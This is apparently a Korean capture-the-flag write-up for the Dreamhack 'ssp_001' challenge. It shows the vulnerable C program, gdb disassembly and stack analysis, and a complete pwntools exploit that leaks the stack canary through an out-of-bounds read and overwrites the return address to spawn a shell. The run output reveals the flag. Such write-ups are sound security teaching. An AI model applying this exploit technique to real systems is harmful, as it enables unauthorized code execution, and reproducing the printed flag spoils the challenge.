https://honey-push-30b.notion.site/SSP_001-ddbf493a39d34fcc969d8c6de2223346
# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dcb7f19d-93bc-4ee3-ab53-e00ec942ff1f/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}
int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
}
```

내장되어 있는 get_shell 함수를 실행시켜 쉘을 획득하는 문제이다. 일단 먼저 어떤 보호기법이 있는지 알아보자.

```c
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

checksec 명령어를 통해 알아본 결과 CANARY 기법과 NX 보호기법이 적용되어 있는 것을 확인 할 수 있다. NX는 이미 내장되어 있는 함수인 get_shell을 실행시킬 것이므로 스택에 실행함수를 넣지 않을 것이기에 고려할 필요가 없고 CANARY 기법만 고려하면 된다.

```c
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
```


E에서는 내가 입력할 사이즈를 정해주고 입력을 할 수 있기 때문에 name의 크기인 0x40(64바이트)보다 더 큰 값을 넣어줄 수 있다.

현재 스택의 상태를 그림으로 그려보기 위해 gdb를 통해 스택에 공간을 얼마나 할당해 주는지를 살펴봤다.

```c
   0x804872b <main>:    push   ebp
   0x804872c <main+1>:  mov    ebp,esp
   0x804872e <main+3>:  push   edi
=> 0x804872f <main+4>:  sub    esp,0x94
   0x8048735 <main+10>: mov    eax,DWORD PTR [ebp+0xc]
   0x8048738 <main+13>: mov    DWORD PTR [ebp-0x98],eax
   0x804873e <main+19>: mov    eax,gs:0x14
   0x8048744 <main+25>: mov    DWORD PTR [ebp-0x8],eax
```

스택에 공간을 0x94만큼 할당해 주는 것을 볼 수 있다. 그리고 ebp-0x8에는 카나리 값을 할당해 주는 것을 볼 수 있다.

canary →0x04

box → 0x40

name → 0x40

select → 0x02

idx  → 0x04

name_len → 0x04

그러면 0x04바이트만큼 크기가 남는데 이는 잘 모르겠으니 패스해둔다...

```c
0x080487eb <+192>:   push   0x8048979
0x080487f0 <+197>:   call   0x80484b0 [printf@plt](mailto:printf@plt)
0x080487f5 <+202>:   add    esp,0x4
0x080487f8 <+205>:   lea    eax,[ebp-0x94]
0x080487fe <+211>:   push   eax
0x080487ff <+212>:   push   0x804898a
0x08048804 <+217>:   call   0x8048540 [__isoc99_scanf@plt](mailto:__isoc99_scanf@plt)
0x08048809 <+222>:   add    esp,0x8
0x0804880c <+225>:   mov    eax,DWORD PTR [ebp-0x94]
0x08048812 <+231>:   push   eax
0x08048813 <+232>:   lea    eax,[ebp-0x88]
0x08048819 <+238>:   push   eax
0x0804881a <+239>:   call   0x80486cc <print_box>
0x0804881f <+244>:   add    esp,0x8
```

이건 gdb로 본 case ‘P’ 부분인데(printf와 scanf가 하나씩만 존재하므로) eax값을 ebp-0x94에 넣어주는 걸로봐서는 idx는 ebp-0x94에 위치하는것 같다.그리고 box는 ebp-0x88의 위치하는 것 같다.

```c
   0x08048824 <+249>:   push   0x804898d
   0x08048829 <+254>:   call   0x80484b0 <printf@plt>
   0x0804882e <+259>:   add    esp,0x4
   0x08048831 <+262>:   lea    eax,[ebp-0x90]
   0x08048837 <+268>:   push   eax
   0x08048838 <+269>:   push   0x804898a
   0x0804883d <+274>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048842 <+279>:   add    esp,0x8
   0x08048845 <+282>:   push   0x804899a
   0x0804884a <+287>:   call   0x80484b0 <printf@plt>
   0x0804884f <+292>:   add    esp,0x4
   0x08048852 <+295>:   mov    eax,DWORD PTR [ebp-0x90]
   0x08048858 <+301>:   push   eax
   0x08048859 <+302>:   lea    eax,[ebp-0x48]
   0x0804885c <+305>:   push   eax
   0x0804885d <+306>:   push   0x0
   0x0804885f <+308>:   call   0x80484a0 <read@plt>
   0x08048864 <+313>:   add    esp,0xc
   0x08048867 <+316>:   mov    eax,0x0
   0x0804886c <+321>:   mov    edx,DWORD PTR [ebp-0x8]
   0x0804886f <+324>:   xor    edx,DWORD PTR gs:0x14
```

이건 case’E’ 부분인데 사용자로 부터 입력받은 값을 0x90(name_len)에 넣어주고 ebp-0x48을 read 인자값으로 받는 것을 보면 ebp-0x48은 name이다.

즉 스택의 상태를 그림으로 그려보면

현재 스택은 이러한 형태를 갖고 있을 것이다. 

![스택구조.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7512bc1c-82ba-499a-99e9-01f045d346f2/%EC%8A%A4%ED%83%9D%EA%B5%AC%EC%A1%B0.png)

그러면 이제 case ‘P’를 이용하여 카나리 값을 추출해보자. idx에 입력되는 값은 box의 크기를 넘을 수 있고 box의 인덱스 하나당 1바이트씩 출력이 될것이므로 0x80,0x81,0x82,0x83만큼의 위치가 카나리 값이다. 이를 통해서 카나리 값을 알아내면된다. (0x81이 아니라 0x80부터인 이유는 index가 0부터 시작하는 것과 이유가 똑같다. box의 index가 0~0x3f까지이므로 0x40부터 box의 index를 넘어선것 거기에 name의 크기인 0x40을 더해주면 카나리의 인덱스임)

case’E’에서 name~EBP+0x4까지의 크기인 0x4B만큼의 크기를 입력하기로하고 0x40만큼 b’A’ 넣어주고 + case’P’ 에서 알게된 카나리 값+ 4바이트 b’A’ + get_shell함수 주소 로 페이로드를 작성해주면 된다. 

```c
gdb-peda$ print get_shell
$1 = {<text variable, no debug info>} 0x80486b9 <get_shell>
```

get_shell의 주소는 위와같다.

이제 페이로드만 작성하면 된다.

```c
from pwn import *

p= remote("host3.dreamhack.games",18090)
canary=b''
for i in range(131,127,-1):
	p.sendlineafter('> ','P')
	p.sendlineafter(": ",str(i))
	data=p.recvline()
	canary+=data[-3:-1]

p.sendlineafter('> ','E')
print(canary)
print(p32(int(canary,16)))
payload=b'A'*0x40
payload+=p32(int(canary,16))
payload+=b'A'*8
payload+=p32(0x80486b9)
print(payload)
p.sendlineafter(": ",'80')

p.sendlineafter(": ",payload)

p.interactive()
```

이 문제를 풀면서 내가 카나리에 대해 완벽하게 이해한 것이 아닌 카나리가 스택에 저장되어있을 때 첫 값이 \x00이라는 것만 기억하고 있었다. 그래서 128~131바이트 값을 읽어서 그대로 넣어주려고 했는데 b’\x00’이 아닌 b’00’형태로 되어있어서 오또카지 오또카지 하다가.. 한참 헤맸다.

암튼 역순으로 카나리 값을 얻어낸후 (그러면 b’12345600’ 이런식일 것임) p32를 이용해 다시 패킹해주면 알아서(b’\x00\x56\x34\x12’)로 된다.

```c
└─# python3 ./answer.py                                                                    1 ⚙
[+] Opening connection to host3.dreamhack.games on port 18090: Done
/root/바탕화면/ssp_1/./answer.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter('> ','P')
/usr/local/lib/python3.10/dist-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
/root/바탕화면/ssp_1/./answer.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter(": ",str(i))
/root/바탕화면/ssp_1/./answer.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter('> ','E')
b'250f4200'
b'\x00B\x0f%'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00B\x0f%AAAAAAAA\xb9\x86\x04\x08'
/root/바탕화면/ssp_1/./answer.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter(": ",'80')
[*] Switching to interactive mode
$ ls
flag
run.sh
ssp_001
$ cat flag
DH{00c609773822372daf2b7ef9adbdb824}
```

막판에 많이 헤매긴 했지만 성공적으로 flag 값을 얻어냈다.
